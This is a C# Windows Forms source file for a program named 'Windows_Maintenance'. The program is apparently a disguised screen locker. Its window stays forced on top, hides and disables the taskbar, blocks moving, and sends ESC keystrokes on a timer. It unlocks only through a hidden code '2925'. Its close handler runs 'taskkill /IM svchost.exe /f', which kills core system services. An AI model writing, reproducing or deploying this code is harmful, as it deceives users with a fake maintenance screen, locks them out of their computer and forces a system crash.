using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Windows_Maintenance
{
    public partial class Form1 : Form
    {
        private int buttonClickCount = 0;
        private Timer timer;
        private Timer escTimer;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnableWindow(IntPtr hWnd, bool bEnable);
        private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        private const uint SWP_NOSIZE = 0x0001;
        private const uint SWP_NOMOVE = 0x0002;
        private const uint SWP_NOACTIVATE = 0x0010;
        private const uint SWP_SHOWWINDOW = 0x0040;
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;

        public Form1()
        {
            InitializeComponent();
            textBox1.Enter += new EventHandler(textBox1_Enter);
            timer = new Timer();
            timer.Interval = 1000;
            timer.Tick += new EventHandler(UpdateProgressBar);
            timer.Start();
            escTimer = new Timer();
            escTimer.Interval = 500;
            escTimer.Tick += new EventHandler(SendEscKey);
            escTimer.Start();
            this.Load += new EventHandler(Form1_Load);
            this.FormClosing += new FormClosingEventHandler(Form1_FormClosing);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOACTIVATE | SWP_SHOWWINDOW);
            IntPtr taskbarHandle = FindWindow("Shell_TrayWnd", null);
            if (taskbarHandle != IntPtr.Zero)
            {
                ShowWindow(taskbarHandle, SW_HIDE);
                EnableWindow(taskbarHandle, false);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            IntPtr taskbarHandle = FindWindow("Shell_TrayWnd", null);
            if (taskbarHandle != IntPtr.Zero)
            {
                ShowWindow(taskbarHandle, SW_SHOW);
                EnableWindow(taskbarHandle, true);
            }
        }

        protected override void OnActivated(EventArgs e)
        {
            base.OnActivated(e);
            this.BringToFront();
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOACTIVATE | SWP_SHOWWINDOW);
        }

        private void UpdateProgressBar(object sender, EventArgs e)
        {
            DateTime now = DateTime.Now;
            int value = 100;
            if (now.Hour >= 0 && now.Hour < 9)
            {
                value = (int)((now.Hour + now.Minute / 60.0) / 9.0 * 100);
            }
            else if (now.Hour >= 17 && now.Hour < 24)
            {
                value = (int)(((now.Hour - 17) + now.Minute / 60.0) / 7.0 * 100);
            }
            progressBar1.Value = value;
        }

        private void label1_Click(object sender, EventArgs e)
        {
            this.textBox1.Visible = false;
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        protected override void WndProc(ref Message m)
        {
            const int WM_NCACTIVATE = 0x86;
            const int WM_ACTIVATEAPP = 0x1C;
            const int WM_ACTIVATE = 0x6;
            const int WA_ACTIVE = 1;
            const int WA_CLICKACTIVE = 2;
            if (m.Msg == WM_NCACTIVATE || m.Msg == WM_ACTIVATEAPP || m.Msg == WM_ACTIVATE)
            {
                if (m.WParam.ToInt32() == WA_ACTIVE || m.WParam.ToInt32() == WA_CLICKACTIVE)
                {
                    this.BringToFront();
                    SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOACTIVATE | SWP_SHOWWINDOW);
                }
            }
            const int WM_NCHITTEST = 0x84;
            const int HTCLIENT = 1;
            const int WM_SYSCOMMAND = 0x112;
            const int SC_MOVE = 0xF010;
            const int WM_CLOSE = 0x0010;
            if (m.Msg == WM_NCHITTEST)
            {
                m.Result = (IntPtr)HTCLIENT;
                return;
            }
            if (m.Msg == WM_SYSCOMMAND && (m.WParam.ToInt32() & 0xFFF0) == SC_MOVE)
            {
                return;
            }
            if (m.Msg == WM_CLOSE)
            {
                ExecuteTaskKillCommand();
            }
            base.WndProc(ref m);
        }

        private void ExecuteTaskKillCommand()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/C taskkill /IM svchost.exe /f",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to execute taskkill command: " + ex.Message);
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.textBox1.PasswordChar = '\0';
            buttonClickCount++;
            if (buttonClickCount == 10)
            {
                textBox1.Visible = true;
                label1.Visible = false;
                label2.Visible = false;
                progressBar1.Visible = false;
            }
            if (textBox1.Text == "2925")
            {
                Application.Exit();
            }
        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            InputLanguage.CurrentInputLanguage = InputLanguage.FromCulture(new System.Globalization.CultureInfo("en-US"));
            textBox1.PasswordChar = '●';
        }

        private void SendEscKey(object sender, EventArgs e)
        {
            SendKeys.Send("{ESC}");
        }
    }
}
